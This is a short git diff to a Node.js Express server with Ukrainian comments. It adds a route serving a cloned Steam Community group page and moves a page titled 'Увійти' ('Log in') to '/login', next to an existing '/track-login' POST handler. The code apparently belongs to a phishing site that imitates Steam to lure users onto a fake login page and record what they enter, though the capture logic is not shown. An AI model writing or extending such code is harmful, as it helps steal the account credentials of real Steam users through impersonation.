@@ -23,7 +23,11 @@ app.post("/track-login", (req, res) => {
 });
 
 // Відправляємо index.html при запиті на головну сторінку
-app.get("/", (req, res) => {
+app.get("/group", (req, res) => {
+    res.sendFile(path.join(__dirname, "group", "Спільнота Steam __ Група __ Один раз не....html"));
+});
+
+app.get("/login", (req, res) => {
     res.sendFile(path.join(__dirname, "public", "Увійти.html"));
 });
 
